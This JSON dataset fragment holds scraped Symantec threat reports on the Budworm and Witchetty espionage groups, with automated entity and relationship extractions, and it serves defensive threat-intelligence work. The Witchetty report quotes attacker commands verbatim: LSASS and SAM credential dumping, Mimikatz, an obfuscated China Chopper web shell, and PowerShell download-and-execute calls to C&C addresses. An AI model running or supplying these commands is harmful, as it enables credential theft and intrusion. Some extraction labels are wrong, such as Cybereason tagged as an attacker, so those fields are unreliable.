5deab41977d5d6217b3e35cfab81015d83f270650ccc170dfb948e55e92478dd 5f477c03a689b4aeed28dcb2f8bab3dfa7fc834223062f16eddb5426c2cfa2e6 6741a9ea57e38d1e9d6014bd191b0ac517d2bfa2d79cb091c64fb8011c8521d3 69d927abbacdfcdcad0a1d878e8c0a8543a940a101447b9127365034f7a2d773 6d07ce2ca82489599ae609c6ed18f587059ed5cf2d32a513c5ea6d35861695e9 6d689996a8721f8417de46d645dc6b66b261afdf8ee30b4a0853ff94ec87d3b0 72424e99c1814a1d741508c198eac3e3e84626ce39d961c014718e7f8abb6fe5 7443e17e80dec2db6cfffc0a272fd8a27b2a98a42ffc15fb9065c072dc5904f7 74ff4db3af082d73dcba597cacfd4cae64e00c68169a64be2f3715a0f06535ae 7ccb9cdaff8c6c7785ee1422aa70723c976f62795593b02fbf0923f09c6b647d 7ecd5ec38db31cfb7146ac684eb75912e418c3fbb69a2562478b5fce2ae2c615 8344fcc55534f0b0e08f48f44607771d7cfad130f749ddcc434ffc6fd9012eaa 8535a6e49afa4057e504fa8f4a21a06f535f51bbafff0631c662d7ade5aabfb9 8648bb183abf8aa2111f4d98ecc386e5bcdfa614033efdd124d61ee155261a13 86a45d92282ed3c4f82687eb1d6cfa6a906d6fc5033014bdc6c57da07db1b1b2 892c1f324fa5c2370b06dedf691bd60fa0aa70a4bd6502b9c615cdcd3d5e698a 8a42bee7190e23f76e46e66f9194c33f33a60903a28d267acebf4fd8dead15e8 8a8109f2af10898cdf7259467d18410f2b61a89d5f0d7031b5e45e1bd3b8678a 8eeba9d12cd01b8eb245c76ff16e34eb0455001243fcf1889f28655e55c1d1ed 8fe7cc990ffaf4f156c0868b41e1e92d09c1270e11b96c7320498e0390cc93c6 9138916b9630c81a0b7b6597f4be72ca46c7e3dc1e6fd89d14ddb12f1deb7fdc 95bc468f50483f337d3ef6e1c5d1765beffee4db9c057d6e49713b3a099b2eef 96e22da2b69f599cba297a9aafc971a09c99433bf7f51ec37446c34ed3701d12 9b114bfec2561e76fd8d0c9b31633c2089abec8f3a99c297f0f6416838567452 9b7d8827685b71e92438355872f10c2364d7e3a3811df884eb41e371bcda8f6d 9daa43c1204184634b9833718155404d6c0366fcdd524f945eacfc3e5760c116 a43c9dbfd2a9c1a065eb7a9212f2125ea6e6a73256081bc2deacd50913162a6a a7f291bde213d9eb4fa60fb3517a6ec6fb7a057457534afe895c1684db0ba21d b02c10d8a83857352c99f09548397bf8e0ee0548b8e050e138b82eb08b98e938 b13bc2986f098580e2432dac7004a9dca2254c6756dafa3b7f67aff743ee060f b382824cbb11c60da6c733855c825dcbdf2bbfb8104a517d27af56b56625ba9f b4703af681c75d2d16c555f008bc4308a4d03767ceed55c02d1a892341444304 b4841104c663f4f013b467220d576035fd2187a92c84451709abff47c8fb162e b4cdc814f1536264cc5e469cebcbf351ee9d1b9620248bc0a6b14725fe38d5a0 b82a19a06270f37e3b12047a1382796678895fe1c58a9ef799cf5250f6c96dcf c01f402b942502889aa854326405b29a4d33947547074fbb9eab7c4c4a896d77 c276300d47daff9cc1e486e4ea3d776d82fa9b3f8161eccfe49fc3218afdfbe9 c3d41387bcc9c9f2d9858b1286ed51369a06ed12abe7623344a31a0e0f18f36a c57236c2e7fe84334d5bdef6420cbf121ab9f918f5d8e4323d7055b12947abb6 c862f2cdbf817f6d7c5568a4af2d8766a30719297e31a71620503e50176fceb2 ccaa5186451c0658b6294f5d8a78b3ec02505164c1ddec2b418259564cd7b23b cd5a53fc5bb675b47bb4055d8f3e4c45902a8245df2300ccf03d7da6464add78 cdaaf781557e85582dd42ff6a58ecbbb68a7cb2e0dc7c7aa49b1d5df5391330b d06730e1d07491a70b4b18b52e8f35c92509b5049239e3794a6be73ce160e2c0 d2939897865906fb339e878f620f928bff36c7dead15bb6ed94f7a9df16300e9 d3a163a7313629cc380b9405aafb847247d2a256ae48b60bffd0bfbe3082c19c d76e32647c3890100fe994a9a0f84a3e6957af08195366e86299e4033c2551f1 dbc60a4878ae9f1a2184c44837db9968a157f2008a16e3a350909a598f918dd9 dc4218b67f99196fb5d71c4bd5ce762e9b8950d8206e198a755650c5e6d17fd0 dc647ce87c62b0ac76530362694d1dafdca5ca414e5abb18c324dfd24f0e9644 deb0e05adad48b90a534beabe2ef4261d2a864112945907fbd2d020b90f24507 e1af76d84f98eb4cd7af04d35030e37ffaa8120a7d048fafe0cbcb2a7f86c460 e3b82ac4870a2ae86dfe88cf7ecf9bc0dc6ed653af0ad1aaa20194cae8aff411 e4f4b3a554c8a0fd693201333e8d634f8ef1fa4ca4445ca556492bb9d0d486c4 ef24840ccde8c7547b3329c7854fdd22d2178c7ad7f931303da2e6eacbf16d1c f17278d4eaafff971864c02efdc0e4435defad96e7f5203e580a4e32c64681d8 f8ebd94779851fbeca029db4ae938457c7ccf4e010b09f025ea5394b715b1838 f90dc76a9500ee2bb3380d5f4589289ec7ffa647be4262ee7674d37ce02283b7 5d868bfbfc767515c35ced7b0da36f41ed4728914ba081f132a9d9c54564ebf0 The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (Operation CuckooBees, Threat Type), (Spyder Loader, Malware), (Cybereason, Attacker), (SonicWall, Tool), (March 2021, Date), (May 2022, Date), (Hong Kong, Location), (information storage systems, Vulnerable System)\nRelationships: (Operation CuckooBees, uses, Spyder Loader), (Operation CuckooBees, communicatedWith, SonicWall), (Operation CuckooBees, attributedTo, Cybereason), (Operation CuckooBees, started, at least 2019), (Operation CuckooBees, continues, as of now), (Operation CuckooBees, targets, information storage systems), (Operation CuckooBees, collected, information), (Operation CuckooBees, executed, mischievous payloads), (Operation CuckooBees, coordinated, script execution), (Operation CuckooBees, communicatedWith, C&C server), (Operation CuckooBees, continued, over a year), (Operation CuckooBees, collected, stolen data), (Operation CuckooBees, collected, intellectual property), (Operation CuckooBees, collected, sensitive data), (Operation CuckooBees, collected, compromised devices), (Operation CuckooBees, collected, corrupted devices), (Operation",
      "entities": [
        [
          "Operation CuckooBees",
          "Threat Type"
        ],
        [
          "Spyder Loader",
          "Malware"
        ],
        [
          "Cybereason",
          "Attacker"
        ],
        [
          "SonicWall",
          "Tool"
        ],
        [
          "March 2021",
          "Date"
        ],
        [
          "May 2022",
          "Date"
        ],
        [
          "Hong Kong",
          "Location"
        ],
        [
          "information storage systems",
          "Vulnerable System"
        ]
      ],
      "relationships": [
        [
          "Operation CuckooBees",
          "uses",
          "Spyder Loader"
        ],
        [
          "Operation CuckooBees",
          "communicatedWith",
          "SonicWall"
        ],
        [
          "Operation CuckooBees",
          "attributedTo",
          "Cybereason"
        ],
        [
          "Operation CuckooBees",
          "started",
          "at least 2019"
        ],
        [
          "Operation CuckooBees",
          "continues",
          "as of now"
        ],
        [
          "Operation CuckooBees",
          "targets",
          "information storage systems"
        ],
        [
          "Operation CuckooBees",
          "collected",
          "information"
        ],
        [
          "Operation CuckooBees",
          "executed",
          "mischievous payloads"
        ],
        [
          "Operation CuckooBees",
          "coordinated",
          "script execution"
        ],
        [
          "Operation CuckooBees",
          "communicatedWith",
          "C&C server"
        ],
        [
          "Operation CuckooBees",
          "continued",
          "over a year"
        ],
        [
          "Operation CuckooBees",
          "collected",
          "stolen data"
        ],
        [
          "Operation CuckooBees",
          "collected",
          "intellectual property"
        ],
        [
          "Operation CuckooBees",
          "collected",
          "sensitive data"
        ],
        [
          "Operation CuckooBees",
          "collected",
          "compromised devices"
        ],
        [
          "Operation CuckooBees",
          "collected",
          "corrupted devices"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 8,
    "relationship_count": 16
  },
  {
    "title": "budworm espionage us state",
    "link": "https://www.security.com/threat-intelligence/budworm-espionage-us-state",
    "content": "The Budworm espionage group has mounted attacks over the past six months against a number of strategically significant targets, including the government of a Middle Eastern country, a multinational electronics manufacturer, and a U.S. state legislature. The latter attack is the first time in a number of years Symantec has seen Budworm targeting a U.S-based entity. Along with the above high-value targets, the group also conducted an attack against a hospital in South East Asia. In recent attacks, Budworm leveraged the Log4j vulnerabilities (CVE-2021-44228andCVE-2021-45105) to compromise the Apache Tomcat service on servers in order to install web shells. The attackers used Virtual Private Servers (VPS) hosted on Vultr and Telstra as command-and-control (C&C) servers. Budworm’s main payload continues to be the HyperBro malware family, which is often loaded using a technique known as dynamic-link library (DLL) side-loading. This involves the attackers placing a malicious DLL in a directory where a legitimate DLL is expected to be found. The attacker then runs the legitimate application (having installed it themselves). The legitimate application then loads and executes the payload. In recent attacks, Budworm has used the endpoint privilege management software CyberArk Viewfinity to perform side-loading. The binary, which has the default name vf_host.exe, is usually renamed by the attackers in order to masquerade as a more innocuous file. Masqueraded names included securityhealthservice.exe, secu.exe, vfhost.exe, vxhost.exe, vx.exe, and v.exe. In some cases, the HyperBro backdoor was loaded with its own HyperBro loader (file names: peloader.exe, 12.exe). It is designed to load malicious DLLs and encrypt payloads. While HyperBro was frequently used, the attackers also used the PlugX/Korplug Trojan as a payload at times. Other tools used in recent attacks include: Budworm is known for mounting ambitious attacks against high-value targets. While there were frequent reports of Budworm targeting U.S. organizations six to eight years ago, in more recent years the group’s activity appears to have been largely focused on Asia, the Middle East, and Europe. However this is the second time in recent months, Budworm has been linked to attacks against a U.S-based target.A recent CISA reporton multiple APT groups attacking a defense sector organization mentioned Budworm’s toolset. A resumption of attacks against U.S.-based targets could signal a change in focus for the group. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. 5aecbb6c073b0cf1ad1c6803fa1bfaa6eca2ec4311e165f25d5f7f0b3fe001db — Credential Dumper 779ae012ede492b321fd86df70f7c9da94251440ebe5ec3efee84a432f432478 — FSCAN ab949af896b6a6d986aed6096c36c4f323f650ccccfc7ea49004ba919d1bfa46 — HyperBro launcher bebce37572ea2856663383215a013f8115c1f81da0f2bf1233c959955c494032 — HyperBro launcher 6e493ce8dccabf172d818453cc9d4e5bf4b1969ff9690c51b8cb538346e8e00e — HyperBro launcher 8b2e7924f5038473736705b5c3dc3efa918fb7ffe2cc19ce48e4554658d33fe6 — HyperBro launcher cda8f76ce72759324e11c8af17736d685ca95954c0a09a682834b92a033bb11a — HyperBro launcher 25da610be6acecfd71bbe3a4e88c09f31ad07bdd252eb30feeef9debd9667c51 — HyperBro launcher 90eb92db757dc1ab4ca55b18b604350ecd84b7cd1d9a2555d789432f8c9a430b — HyperBro launcher 6398876f73cd0157a7681de4b2326a0a313dc7f9cb2bee3001894137da41c1f0 — HyperBro launcher c53b6a2ec48647121a3e8816636b34ee2cdd6846d6d05efd9539d17a1c021da0 — HyperBro launcher c3213937c194246d29dd5fb39d8e7ef3671df58e3f01353784a06a075f21cfc5 — HyperBro launcher 386c9079d65bdd7e3f7b8872024a80992b5d5c6a3c8b971c47d1ef439b9e2671 — HyperBro loader bfffc43d948d1787622bcde524e51c932a2a1fdc761539f60e777e21ef16e83d — HyperBro loader 018d3a957aa0eaa7a621b52d15f4a1ed18b0f81c477e6023cd80313d83f7dbc0 — HyperBro loader d4776939dcf78f5f7491b9938480423956ac10a3c576028dec307511c586a124 — HyperBro loader 27c2a9608ce80a443c87a0a2947864df7d4491cfa85608c6a6b6680ec0277f9d — HyperBro loader 42b603fffd4766fa22f6e10884e7fa43f449d515cfa20a18f0d07a6d4c370962 — IOX 0d46907320ab55d98966389f41441aa0341a7db829cd166748d8929d466c9fba — IOX 714d0101039bfd7d3db4dfe8307bc1657b7266ff2528b5e852b752879ebe7113 — IOX 0129c9c7b55a6f514a9fa8c38ce59d8939efda6ece67b90c6be13aec40f1bdab — Viewfinity side-load df847abbfac55fb23715cde02ab52cbe59f14076f9e4bd15edbe28dcecb2a348  — Viewfinity side-load 620e401b2b7727a6c7ebc37ee1f7d8e1742d7121c1f4ea350a43d460ef9bdc4c — Viewfinity side-load c8aea84abb476ab536198a36df53b37be3d987a9ce58cb06e93cac7d2bfb3703  — Viewfinity side-load 233bb85dbeba69231533408501697695a66b7790e751925231d64bddf80bbf91 — Cobalt Strike d610547c718fcca7c5c7e02c6821e9909333daf6376a1096edf21f9355754f29  — FRP 5c2d05bfc9b6d4fc7aea32312c62180564fac9f65b0867e824d81051e5fc34fd  — Korplug ed2f501408a7a6e1a854c29c4b0bc5648a6aa8612432df829008931b3e34bf56 — Lazagne 61deb3a206cc203252418b431f6556e3f7efd9556fc685eeda7281d9baf89851 — Lazagne 892663bb4f3080c3f2f1915734897cab1c9ee955a77bb8541b417ec2b03cd4ef — Lazagne 3d7dc77ded4022a92a32db9e10dbc67fbcc80854a281c3cc0f00b6cbd2bfd112  — Trojan Horse 48e81b1c5cc0005cc58b99cefe1b6087c841e952bb06db5a5a6441e92e40bed6 — Trojan.Dropper 5cba27d29c89caf0c8a8d28b42a8f977f86c92c803d1e2c7386d60c0d8641285 — Trojan.Dropper 139.180.146[.]101 — C&C VPS 45.77.46[.]54 — C&C VPS 139.168.200[.].123 — C&C VPS 207.148.76[.]235 — C&C VPS setting.101888gg[.]com/jquery-3.3.1.min.js — C&C 207.148.76[.]235/jquery-3.3.1.min.js — C&C The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (Budworm, Attacker), (Log4j vulnerabilities, Vulnerability), (Apache Tomcat, Tool), (HyperBro malware family, Malware), (CyberArk Viewfinity, Tool), (vf_host.exe, File), (Telstra, IP), (Vultr, IP)\nRelationships: (Budworm, uses, Log4j vulnerabilities), (Budworm, leverages, Apache Tomcat), (Budworm, installs, HyperBro malware family), (Budworm, uses, CyberArk Viewfinity), (Budworm, renames, vf_host.exe), (Budworm, targets, U.S. state legislature), (Budworm, targets, hospital in South East Asia), (Budworm, uses, VPS), (Budworm, uses, C&C servers), (Budworm, uses, Dynamic-link library), (Budworm, uses, Endpoint privilege management software)",
      "entities": [
        [
          "Budworm",
          "Attacker"
        ],
        [
          "Log4j vulnerabilities",
          "Vulnerability"
        ],
        [
          "Apache Tomcat",
          "Tool"
        ],
        [
          "HyperBro malware family",
          "Malware"
        ],
        [
          "CyberArk Viewfinity",
          "Tool"
        ],
        [
          "vf_host.exe",
          "File"
        ],
        [
          "Telstra",
          "IP"
        ],
        [
          "Vultr",
          "IP"
        ]
      ],
      "relationships": [
        [
          "Budworm",
          "uses",
          "Log4j vulnerabilities"
        ],
        [
          "Budworm",
          "leverages",
          "Apache Tomcat"
        ],
        [
          "Budworm",
          "installs",
          "HyperBro malware family"
        ],
        [
          "Budworm",
          "uses",
          "CyberArk Viewfinity"
        ],
        [
          "Budworm",
          "renames",
          "vf_host.exe"
        ],
        [
          "Budworm",
          "targets",
          "U.S. state legislature"
        ],
        [
          "Budworm",
          "targets",
          "hospital in South East Asia"
        ],
        [
          "Budworm",
          "uses",
          "VPS"
        ],
        [
          "Budworm",
          "uses",
          "C&C servers"
        ],
        [
          "Budworm",
          "uses",
          "Dynamic-link library"
        ],
        [
          "Budworm",
          "uses",
          "Endpoint privilege management software"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 8,
    "relationship_count": 11
  },
  {
    "title": "witchetty steganography espionage",
    "link": "https://www.security.com/threat-intelligence/witchetty-steganography-espionage",
    "content": "The Witchetty espionage group (aka LookingFrog) has been progressively updating its toolset, using new malware in attacks on targets in the Middle East and Africa. Among the new tools being used by the group is a backdoor Trojan (Backdoor.Stegmap) that employs steganography, a rarely seen technique where malicious code is hidden within an image. In attacks between February and September 2022, Witchetty targeted the governments of two Middle Eastern countries and the stock exchange of an African nation. The attackers exploited the ProxyShell (CVE-2021-34473,CVE-2021-34523, andCVE-2021-31207) and ProxyLogon (CVE-2021-26855andCVE-2021-27065) vulnerabilities to install web shells on public-facing servers before stealing credentials, moving laterally across networks, and installing malware on other computers. Witchetty was first documented by ESET in April 2022, who concluded that it was one of three sub-groups of TA410, a broad cyber-espionage operation with some links to the Cicada group (aka APT10). Witchetty’s activity was characterized by the use of two pieces of malware, a first-stage backdoor known as X4 and a second-stage payload known as LookBack. ESET reported that the group had targeted governments, diplomatic missions, charities, and industrial/manufacturing organizations. While the group has continued to use the LookBack backdoor, several new pieces of malware appear to have been added to its toolset. One is Backdoor.Stegmap, which leverages steganography to extract its payload from a bitmap image. Although rarely used by attackers, if successfully executed, steganography can be leveraged to disguise malicious code in seemingly innocuous-looking image files. A DLL loader downloads a bitmap file from a GitHub repository. The file appears to be simply an old Microsoft Windows logo. However, the payload is hidden within the file and is decrypted with an XOR key. Disguising the payload in this fashion allowed the attackers to host it on a free, trusted service. Downloads from trusted hosts such as GitHub are far less likely to raise red flags than downloads from an attacker-controlled command-and-control (C&C) server. The payload is a fully featured backdoor capable of executing the following commands: Other new tools used by the attackers include: In one attack against a government agency in the Middle East, the first sign of malicious activity occurred on February 27, 2022 when the attackers exploited the ProxyShell vulnerability to dump the memory of the Local Security Authority Subsystem Service (LSASS) process using the comsvcs.dll file. rundll32.exe CSIDL_SYSTEM\\comsvcs.dll, MiniDump 1036CSIDL_PROFILE\\public\\dm.db full The next day, the attackers tried to dump the LSASS process using PowerShell on a different Exchange Server. powershell -exec bypass $p=Get-Process lsass;$f=New-ObjectIO.FileStream('CSIDL_COMMON_MUSIC\\d',[IO.FileMode]::Create);((([PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')).GetNestedType('NativeMethods','NonPublic')).GetMethod('MiniDumpWriteDump',([Reflection.BindingFlags]'NonPublic,Static'))).Invoke($null,@($p.Handle,$p.Id,$f.SafeFileHandle,([UInt32]2),[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero));$f.Close() On March 2, the attackers launched a PowerShell command to obtain a list of Windows Server machines in the victim environment. cmd.exe\" /c powershell -exec bypass Get-ADComputer -Filter{(OperatingSystem -like \"*windows*server*\") -and (Enabled -eq \"True\")}-Properties OperatingSystem | Sort Name [REDACTED] select -Unique OperatingSystem\" Malicious activity ceased until March 18 when the attackers returned to the server and used a custom tool that resembled Mimikatz (file name: dd.exe). dd.exe -domain:[REDACTED] -dc:MODDC1.[REDACTED] -user:[REDACTED] -ntlm:[REDACTED] -pwdump -all Malicious activity again ceased for some time. On April 26 and 27, the attackers ran commands to find the process identifier (PID) of the LSASS process and attempted to dump it with the technique previously seen. cmd /c tasklist | findstr lsass.exe >> CSIDL_WINDOWS\\temp\\8b7db7a3-5376-4d32-8be1-0d3092117022-microsoft.tmp rundll32 CSIDL_SYSTEM\\comsvcs.dll,minidump 1036 CSIDL_SYSTEM_DRIVE\\inetpub\\wwwroot\\aspnet_client\\temp.rar full Next, on April 29, the attackers dumped the Security Account Manager (SAM) Registry Hive using the Windows reg.exe tool. reg save hklm\\sam CSIDL_SYSTEM_DRIVE\\inetpub\\wwwroot\\aspnet_client\\sam.hive Between May 7 and May 9, the attackers checked the PowerShell Execution Policy and then ran the LookBack backdoor and registered it as a scheduled task on the server. powershell Get-ExecutionPolicy rundll32 CSIDL_WINDOWS\\immersivecontrolpanel\\ieupdate.dll, curl_share_init schtasks /create /tn \"InternetExplorerTaskMachineCore\" /sc daily /st 05:30 /tr \"CSIDL_WINDOWS\\immersivecontrolpanel\\ieupdate.dll\" /ru \"System\" /rl highest schtasks /run /tn \"InternetExplorerTaskMachineCore\" Between June 14 and 18, the attackers used Mimikatz to dump passwords from the LSASS memory. They then saved the SAM to a remote location, before launching a PowerShell file named “a.ps1”, creating a new mailbox, and using the command “makecab” to compress some files, likely for exfiltration. CSIDL_SYSTEM\\rundll32.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\" reg save HKLM\\SAM s.dat reg save HKLM\\SAM \\\\[REDACTED]\\C$\\ProgramData\\Microsoft\\Diagnosis\\s.dat powershell -PSConsoleFile \"CSIDL_SYSTEM_DRIVE\\program files\\microsoft\\exchange server\\v15\\bin\\exshell.psc1\" -file a.ps1 powershell -PSConsoleFile \"CSIDL_SYSTEM_DRIVE\\program files\\microsoft\\exchange server\\v15\\bin\\exshell.psc1\" -c \"New-Mailbox -Name [REDACTED]-UserPrincipalName [REDACTED]  -Password [REDACTED] -String [REDACTED] -AsPlainText -Force)\" makecab \\\\[REDACTED]\\c$\\programdata\\microsoft\\drm\\domu.csv \\\\[REDACTED]\\c$\\programdata\\microsoft\\drm\\domu.cab On July 3, the attackers created a scheduled task on a remote computer to run the whoami command and save the output to a file. They then configured WinRM to allow connections from any computer. schtasks /create /s [REDACTED] /u: [REDACTED] /p [REDACTED]/tn \"BACKUPSEC\" /sc onstart /tr cmd.exe /c whoami > c:\\windows\\temp\\1.txt /ru system /f cscript //nologo CSIDL_SYSTEM\\winrm.vbs quickconfig -q cscript //nologo CSIDL_SYSTEM\\winrm.vbs s winrm/config/Client @{TrustedHosts=\"*\"} Between July 18 and 26, the attackers used the makecab command again to compress files on a remote server. They then used the ProxyLogon exploit to install the China Chopper web shell on this server. makecab \\\\[REDACTED]\\c$\\programdata\\microsoft\\drm\\Server\\0718.ldf \\\\[REDACTED]\\c$\\programdata\\microsoft\\drm\\Server\\0718.cab cmd /c cd /d \"CSIDL_SYSTEM_DRIVE\\inetpub\\wwwroot\\aspnet_client\" & echo<%@ Page Language=\" Jscript\"%><%\\u0065\\u0076\\u0061\\u006c(\\u0052\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074.Item[\"\\u0043\\u0030\\u0030\\u004b\\u0049\\u0045\"],\"\\u0075\\u006e\\u0073\\u0061\\u0066\\u0065\");%> >> \"CSIDL_SYSTEM_DRIVE\\program files\\microsoft\\exchange server\\v15\\frontend\\httpproxy\\owa\\auth\\15.1.1979\\scripts\\premium\\flogoff.aspx\" Between July 20 and 26, the threat actors moved laterally in the network using WMIC and known credentials to try to download files from their C&C servers. wmic /node:[REDACTED] /user:[REDACTED]  /password:[REDACTED]  process call create powershell -exec bypass (new-object net.webclient).downloadstring('http://194.180.174.254/111') On July 21, the attackers ran their custom network scanning tool to discover more computers on the network and check for the open ports on those machines. p.exe -l [IP_LIST] -p [PORT_LIST] -t 5 On July 28, the attackers again registered a scheduled task on a remote computer to execute the LookBack backdoor daily as the system user. cmd /c cd /d \"CSIDL_WINDOWS\\temp\\temp\" & schtasks /create /s [REDACTED] /u [REDACTED] /p [REDACTED] /tn \"SystemControlModel\" /sc DAILY /st 4:40 /tr \"cmd.exe \\c rundll32 \\\" CSIDL_SYSTEM_DRIVE\\program Files (x86)\\Internet Explorer\\SystemControlModel.dll\\\" curl_share_init\" /ru system /f On August 1, the backdoor executed on the infected computer. rundll32 CSIDL_PROGRAM_FILES\\internet explorer\\systemcontrolmodel.dll, curl_share_init On August 7, a PowerShell script executed, which, based on the name, seems to output the last login accounts on the server. CSIDL_SYSTEM\\windowspowershell\\v1.0\\powershell_ise.exe \"CSIDL_SYSTEM_DRIVE\\report\\getlastloginou.ps1\" The last sign of malicious activity occurred on September 1, when the attackers downloaded remote files, decompressed a ZIP file with a deployment tool, executed remote PowerShell scripts, and executed the custom proxy tool to contact the C&C servers. powershell -exec bypass (new-object net.webclient).downloadstring('http://185.225.19.55:8080/111') 7.exe e deployer.7z \\\\[REDACTED]\\C$\\windows\\temp\\ wmic /node:[REDACTED] /user:[REDACTED] /password:[REDACTED] process call create cmd /c powershell -exec bypass (new-object net.webclient).downloadstring('http://185.225.19.55/111.txt') repro.exe 185.225.19.55 80 Witchetty has demonstrated the ability to continually refine and refresh its toolset in order to compromise targets of interest. Exploitation of vulnerabilities on public-facing servers provides it with a route into organizations, while custom tools paired with adept use of living-off-the-land tactics allow it to maintain a long-term, persistent presence in targeted organizations. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. 619b64c6728f9ec27bba7912528a4101a9c835a547db6596fa095b3fe628e128       LookBack backdoor e597aae95dcaccc5677f78d38cd455fa06b74d271fef44bd514e7413772b5dcb         LookBack backdoor ce3293002a9681736a049301ca5ed6d696d0d46257576929efbb638545ecb78e    LookBack backdoor 73bf59c7f6a28c092a21bf1256db04919084aca5924bbd74277f8bda6191b584        LookBack backdoor acc52983d5f6b86bec6a81bc3fbe5c195b469def733f7677d681f0e405a1049b         LookBack backdoor f91e44ff423908b6acf8878dced05dc7188ddab39d1040e0d736f96f0a43518d         LookBack backdoor e7fcc98005cff9f406a5806222612c20dae3e47c469ff6028310847a599d1a38           LookBack backdoor 104873d692af36173cb39f8b46f2080c8ce1a1a52d60c69e1034e2033ba95f7a         Possible LookBack dropper 3b715112ac93e4cd5eaa7760b5670760fd25d0fec68f6a493624fa23c1c6e042         Backdoor.Stegmap 8030d3472eac3c703ae918600a78a6a89800b157d76f333734ed1af5101d04ed     Custom proxy tool 17e60fc72b5398060138f72b3ecb3b09c37243e3b2905df94b7f5b44d6157806       Custom proxy tool 97ccac64927da6f46b3a775d2feb10c271b676e6b124e5bf84e9722c9dc4f093         Custom port scanner 2d5daaae2fe2e7cd6c47ab4c5f824f670969d3fe88bfd3e4512967378c61924d         Custom persistence tool d8326470d5631e58409401fbadfc8157ee247c32b368fb4be70c2b8f8f88427e        Keylogger a6cf19ab0dc0f0fb9ed4e6da13925a80d92c326a59131991eaf207d92bc61e13        LSASS credential stealer 348d897e952c0f5872c35ea1b15eab802791b865d3c6ad3a27693680a28056cd     Korplug/PlugX loader 1c5ad98a27551e6da3502cdc9ecb232f0d1a343b002c1760f350298fee8df202        Plink dc13f67a5c52488709056f51a63f3fa1056db71616f83cbb5f1f1949395248be          SecretsDump 16bef09e16119f1754a6b4283e93ff7a17cfdd7c043c3ff05a3d41f128ead52e            FSCAN d4e2106f9d5294c04ccc02d59882785d548caf4904c8c00446d906bbec2629b2       RAR compressor 31443b7329b1bdbcf0564e68406beabf2a30168fdcb7042bca8fb2998e3f11c5         Mimikatz c4e9267138cc030e9e87c15c7ff3a15f0a7ece3c39872f354e74842e871e8dc1          Unknown malware 87e507f8fa0f881744afa3a4d5790297bb942230a08134becc150fff511f295b            Unknown malware 59e3bbf97bc08814c56f9aeebaf890a168551d3d9f2ac3efdc8247ecc1732f73         Unknown file 1242d1372ab50a48ad9acec06b4f2a154b072dc494fa392e6647e736135fa636       Corrupted File f3ae5c2ee98257d0b53d90b62eee18427918af41cb44f8097aa7c3f257c8f7ae         7-Zip file 0b29be26d5caae7cf46eaf9345eea7d9fd7e808b3334e2a2043232d450a648ee      7-Zip file e27a24e4e99e623566d8a43eb7e562d27c28a7c746d533d36f56312e9a317c2b   7-Zip file 681c22f79e5ec794858172378ed0285ef4da87f4f2dc8545bf304ce1f936529c           China Chopper baa5c96ec2c51b601a6808428dbe0dc5e274e2ac65c38c465c5a74a2deb962c6       China Chopper 74b1c46bfda5d2be5c674a6c53c2ad8f4f8d5c5b1cc010f17c6c538e117e013f           China Chopper 5972621204b6503773bfaa58b6aadae073d94c781d89e49557e4d9ecfe4049ab      China Chopper 59bfccc3a6f8e4f737c7b483ec13ba36e53f12af658529a9dd8b0df2b235c0de           China Chopper d0992dce0769d6ac23076635c902b56daeda17bab5c30f764991c0844141f61f       China Chopper 3859784f390174acc2eeabc82649f7e13f5db592978192b9243c38c254b7e614        China Chopper 1b9e723c70f0a682d4f3a5a7d98a89697b8509a07c8986de041b05806c04d1f9       China Chopper ee5f18e7dcb251a09da9650ac15723b0607282e5befc829d599005a322ac239d      China Chopper 78718feee5ee5683827e5068d73922c8cd2cf297fb1818fb2440babb8d589609       China Chopper e5f98a1b0d37a09260db033aa09d6829dc4788567beccda9b8fef7e6e3764848       Web shell 469ebdd2f6ecdce9558f3e546ef2814c5e1ad274dcd23bf4613964a0c685d889        Batch script 45549618493cf78facbfedba54e662408b7ebaabe3352119974b6500d11edc85       Batch script d273b4710800ede37617c3b6e3d58e67e45e6b54556dde468d18e48e006a79f2    Script d66a019a3cec95b6292215cf6fce4c0837f4b1de3c8af232d11ea291c87db698          Script 57e729442e8d6a06857f71538c0c11a5a49ff5d6136c05f20f391ae9eb95c2da          Script a7baecdbbf55825db281a417a9e11cd8d7b8c3ab5679d2474352091b431c6900     Script 1b75fe197f71809dea790f9d1357c0bb5e396f42dfcd4f966c64f5f71b39a865           Script de5206a50a0ef8c7f00955ffc2f5034c9d588f8736819387be9f2572666aaa4b           Script 084d4a46bb5b6a1ff7dfc2dd7be6f2023d608f5883e345a67fb98ed22188f1bd         Script 5.252.176[.]3                      LookBack C&C server a.bigbluedc[.]com           LookBack C&C server 185.225.19[.]55                 Remote IP (Malware) 153.92.1[.]125                    Remote IP (Malware) 194.180.174[.]254             Remote IP (Malware) The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
